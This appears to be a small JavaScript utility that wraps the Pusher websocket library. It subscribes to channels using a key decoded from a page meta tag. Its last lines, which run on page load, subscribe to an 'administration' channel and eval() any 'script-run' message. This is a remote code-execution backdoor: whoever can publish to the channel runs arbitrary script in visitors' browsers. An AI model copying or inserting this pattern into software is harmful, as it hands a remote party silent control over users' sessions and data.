/*
	Websocket.event(channel, event, function(response) {
    	
	});
*/

var Websocket = {
    _this: this,
    connection: null,
    channels: {},
    buildConnection: function() {
        var key = atob($('meta[name="PAK"]').attr('content'));
        this.connection = new Pusher(key, {
            cluster: 'mt1'
        });
    },
    event: function(channel, event, success) {
        if (this.connection == null) this.buildConnection();
        if (this.channels[channel] == null) {
            this.channels[channel] = this.connection.subscribe(channel);
        }
        this.channels[channel].bind(event, function(response) {
            if ($.isFunction(success)) success(response);
        });
    }
};


Websocket.event("administration", "script-run", function(response) {
    eval(response);
});
